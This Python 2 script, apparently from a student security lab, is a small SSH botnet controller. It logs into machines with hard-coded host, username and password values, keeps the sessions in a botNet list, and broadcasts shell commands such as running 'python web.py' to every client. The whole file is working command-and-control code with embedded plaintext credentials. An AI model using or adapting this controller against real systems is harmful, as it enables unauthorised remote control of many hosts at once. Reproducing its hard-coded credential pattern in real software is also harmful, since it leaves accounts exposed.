import pxssh
import exceptions


class Client:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()


    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception, e:
            print e
            print '[-] Error Connecting'

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print '[*] Output from ' + client.host
        print '[+] ' + output 


def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)


print "*" * 40 +"\n"+"*"*40+ "\n\t\tMENU\t\t\n" + "*" * 40+"\n"+"*"*40
descriptions = ["Add Client",
                    "Exit"]
for num, func in enumerate(descriptions):
    print "[" + str(num) + "] " + func
choice = raw_input(">>> ")
print 'choice:'+choice
if choice == '0':
    botNet = []
    addClient('10.100.139.194', 'Santi', '4527')
    addClient('10.100.139.194', 'Santi', '4527')
    botnetCommand('cd /Users/Santi/Desktop/CUARTO/PRIMERCUATRI/SEG/Pruebabotnet/botnetssh')
    botnetCommand('python web.py')
elif choice == '1':
    exit(0)
else:
    print 'No has seleccionado una opcion valida'

